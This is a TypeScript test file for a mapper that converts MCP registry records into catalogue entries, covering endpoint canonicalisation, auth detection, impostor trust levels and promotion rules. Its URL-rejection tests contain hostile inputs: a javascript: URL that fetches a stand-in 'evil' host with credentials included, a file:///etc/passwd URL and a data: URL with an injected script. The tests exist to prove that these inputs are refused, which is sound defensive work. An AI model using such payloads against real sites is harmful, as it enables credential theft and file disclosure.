import assert from 'node:assert/strict'
import test from 'node:test'

import { mapRegistryRecord, parseRegistryEntry } from '../src/index.js'

/**
 * The mapper, against the shape the official registry actually returns
 * (verified live; see the Phase 3 contract). Everything here is pure — no
 * database, no network — which is the point of keeping the SSRF verdict and
 * the "has a human touched this row" question out of it.
 */

const officialMeta = (overrides: Record<string, unknown> = {}): Record<string, unknown> => ({
  'io.modelcontextprotocol.registry/official': {
    status: 'active',
    publishedAt: '2026-02-11T09:00:00Z',
    updatedAt: '2026-03-04T12:30:00Z',
    isLatest: true,
    ...overrides,
  },
})

/** The record quoted in the contract, verbatim in shape. */
const contractRecord = (
  server: Record<string, unknown> = {},
  meta: Record<string, unknown> = {},
): unknown => ({
  server: {
    $schema: 'https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json',
    name: 'ac.inference.sh/mcp',
    title: 'inference.sh',
    description: 'Run 150+ AI apps and models from a single hosted MCP endpoint.',
    version: '1.0.0',
    remotes: [{ type: 'streamable-http', url: 'https://mcp.inference.sh/mcp' }],
    ...server,
  },
  _meta: officialMeta(meta),
})

const mapOrThrow = (value: unknown) => {
  const parsed = parseRegistryEntry(value)
  assert.ok(parsed.ok, 'record should parse')
  const mapped = mapRegistryRecord(parsed.record)
  assert.ok(mapped.ok, `record should map: ${mapped.ok ? '' : mapped.reason}`)
  return mapped.mapping
}

test('maps a real registry record onto a catalogue row', () => {
  const mapping = mapOrThrow(contractRecord())

  assert.equal(mapping.registryName, 'ac.inference.sh/mcp')
  assert.equal(mapping.registryVersion, '1.0.0')
  assert.equal(mapping.displayName, 'inference.sh')
  assert.equal(mapping.protocol, 'http')
  assert.equal(mapping.endpointUrl, 'https://mcp.inference.sh/mcp')
  assert.equal(mapping.vendor, 'inference')
  assert.equal(mapping.trustLevel, 'community')
  assert.equal(mapping.auth.authMethod, 'none')
  assert.equal(mapping.upstreamUpdatedAt?.toISOString(), '2026-03-04T12:30:00.000Z')
  // The upstream record travels with the mapping so a re-sync can diff.
  assert.equal(mapping.upstream.name, 'ac.inference.sh/mcp')
  assert.equal(mapping.promotable, true)
})

test('prefers streamable HTTP over legacy SSE when a server publishes both', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [
      { type: 'sse', url: 'https://mcp.example.com/sse' },
      { type: 'streamable-http', url: 'https://mcp.example.com/mcp' },
    ],
  }))
  assert.equal(mapping.protocol, 'http')
  assert.equal(mapping.endpointUrl, 'https://mcp.example.com/mcp')
})

test('falls back to SSE when that is all a server publishes', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [{ type: 'sse', url: 'https://mcp.example.com/sse' }],
  }))
  assert.equal(mapping.protocol, 'sse')
})

test('derives the display name from the last path segment when there is no title', () => {
  const mapping = mapOrThrow(contractRecord({
    name: 'io.github.acme/notion-mcp-server',
    title: undefined,
  }))
  assert.equal(mapping.displayName, 'Notion')
})

test('an unnameable record still becomes a row, but is not promotable', () => {
  const parsed = parseRegistryEntry(contractRecord({ name: 'io.example/mcp', title: undefined }))
  assert.ok(parsed.ok)
  const mapped = mapRegistryRecord(parsed.record)
  assert.ok(mapped.ok)
  assert.equal(mapped.mapping.displayName, 'io.example/mcp')
  assert.equal(mapped.mapping.promotable, false)
})

test('nothing ingested is ever verified, whatever endpoint it claims', () => {
  const ordinary = mapOrThrow(contractRecord({
    remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }],
  }))
  assert.equal(ordinary.trustLevel, 'community')

  // The attack the badge invites: the record's author picks its own name,
  // title, description *and* endpoint, so pointing at a well-known vendor's
  // real MCP URL must not buy "Reviewed by Nessie and confirmed with its
  // publisher" for somebody else's copy.
  const impostor = mapOrThrow(contractRecord({
    name: 'io.github.attacker/notion-official',
    title: 'Notion (Official)',
    remotes: [{ type: 'streamable-http', url: 'https://mcp.notion.com/mcp' }],
  }))
  assert.equal(impostor.trustLevel, 'community')
})

test('the persisted endpoint is canonical, so an admin lock cannot be dodged', () => {
  // Same server as a lock on `https://api.githubcopilot.com/mcp`, spelled three
  // ways that a near-exact string comparison would miss.
  for (const url of [
    'https://API.GitHubCopilot.com/mcp',
    'https://api.githubcopilot.com:443/mcp',
    'https://api.githubcopilot.com/mcp/',
  ]) {
    const mapping = mapOrThrow(contractRecord({
      remotes: [{ type: 'streamable-http', url }],
    }))
    assert.equal(mapping.endpointUrl, 'https://api.githubcopilot.com/mcp', url)
  }
})

test('a query string is part of the endpoint and survives canonicalisation', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp/?tenant=acme' }],
  }))
  assert.equal(mapping.endpointUrl, 'https://mcp.example.com/mcp?tenant=acme')
})

test('an upper-case scheme is the https it says it is, and can be promoted', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [{ type: 'streamable-http', url: 'HTTPS://mcp.example.com/mcp' }],
  }))
  assert.equal(mapping.endpointUrl, 'https://mcp.example.com/mcp')
  assert.equal(mapping.promotable, true)
})

test('a required secret Authorization header classifies the app as bearer', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [{
      type: 'streamable-http',
      url: 'https://mcp.example.com/mcp',
      headers: [{
        name: 'Authorization',
        value: 'Bearer <token>',
        isRequired: true,
        isSecret: true,
      }],
    }],
  }))
  assert.equal(mapping.auth.authMethod, 'bearer')
})

test('another required secret header becomes an api_key on that exact header name', () => {
  const mapping = mapOrThrow(contractRecord({
    remotes: [{
      type: 'streamable-http',
      url: 'https://mcp.example.com/mcp',
      headers: [{ name: 'X-Api-Key', isRequired: true, isSecret: true }],
    }],
  }))
  assert.equal(mapping.auth.authMethod, 'api_key')
  assert.deepEqual(mapping.auth.authConfig, {
    method: 'api_key',
    headerName: 'X-Api-Key',
    valuePrefix: '',
  })
})

// ─── URL rejection: the whole point of the review that preceded this work ────

test('a non-http(s) endpoint is refused before anything is persisted', () => {
  for (const url of [
    "javascript:fetch('https://evil',{credentials:'include'})",
    'file:///etc/passwd',
    'data:text/html,<script>alert(1)</script>',
    'ftp://example.com/mcp',
  ]) {
    const parsed = parseRegistryEntry(contractRecord({
      remotes: [{ type: 'streamable-http', url }],
    }))
    assert.ok(parsed.ok)
    const mapped = mapRegistryRecord(parsed.record)
    assert.equal(mapped.ok, false, url)
  }
})

test('a hostile websiteUrl or repository url is dropped, not stored', () => {
  const mapping = mapOrThrow(contractRecord({
    websiteUrl: "javascript:fetch('https://evil',{credentials:'include'})",
    repository: { url: 'data:text/html,<script>alert(1)</script>' },
  }))
  assert.equal(mapping.websiteUrl, null)
  assert.equal(mapping.repositoryUrl, null)
  assert.equal(mapping.sourceUrl, null)
})

test('ordinary http(s) links survive', () => {
  const mapping = mapOrThrow(contractRecord({
    websiteUrl: 'https://inference.sh',
    repository: { url: 'https://github.com/acme/mcp' },
  }))
  assert.equal(mapping.websiteUrl, 'https://inference.sh')
  assert.equal(mapping.repositoryUrl, 'https://github.com/acme/mcp')
  assert.equal(mapping.sourceUrl, 'https://inference.sh')
})

// ─── Admission and promotion gates (contract §1 and §2) ──────────────────────

test('only the latest active version with a usable remote is ingested at all', () => {
  const refusals: Array<[string, unknown]> = [
    ['superseded version', contractRecord({}, { isLatest: false })],
    ['deprecated server', contractRecord({}, { status: 'deprecated' })],
    ['deleted server', contractRecord({}, { status: 'deleted' })],
    ['package-only server', contractRecord({ remotes: undefined })],
    ['stdio-only remote', contractRecord({ remotes: [{ type: 'stdio', url: 'x' }] })],
  ]
  for (const [label, value] of refusals) {
    const parsed = parseRegistryEntry(value)
    assert.ok(parsed.ok, label)
    assert.equal(mapRegistryRecord(parsed.record).ok, false, label)
  }
})

test('a thin description or a plain-http endpoint blocks promotion but not ingestion', () => {
  const thin = mapOrThrow(contractRecord({ description: 'An MCP server.' }))
  assert.equal(thin.promotable, false)

  const insecure = mapOrThrow(contractRecord({
    remotes: [{ type: 'streamable-http', url: 'http://mcp.example.com/mcp' }],
  }))
  assert.equal(insecure.promotable, false)
  assert.equal(insecure.endpointUrl, 'http://mcp.example.com/mcp')
})

test('a record with no registry provenance block is treated as not-latest', () => {
  const parsed = parseRegistryEntry({
    server: {
      name: 'io.example/thing',
      description: 'A perfectly ordinary server with a long enough description.',
      remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }],
    },
  })
  assert.ok(parsed.ok)
  assert.equal(parsed.record.isLatest, false)
  assert.equal(mapRegistryRecord(parsed.record).ok, false)
})

test('the publisher line names the publisher, never a TLD or a registrar', () => {
  // Every shape below is real, taken from the live registry. The failure this
  // pins is a card reading "By com.abundanceapis" (the whole namespace) or
  // "By sh" (the last segment of a namespace that is not reverse-DNS).
  const vendorFor = (name: string): string | null =>
    mapOrThrow(contractRecord({ name })).vendor

  assert.equal(vendorFor('io.github.AgentLineHQ/thing'), 'AgentLineHQ')
  assert.equal(vendorFor('com.abundanceapis/thing'), 'abundanceapis')
  assert.equal(vendorFor('br.com.9bot/thing'), '9bot')
  assert.equal(vendorFor('dev.hatchloop/thing'), 'hatchloop')
  assert.equal(vendorFor('ac.inference.sh/thing'), 'inference')
  // Nothing but registrar parts: say nothing rather than invent an author.
  assert.equal(vendorFor('com.io/thing'), null)
  // No namespace at all.
  assert.equal(vendorFor('thing'), null)
})
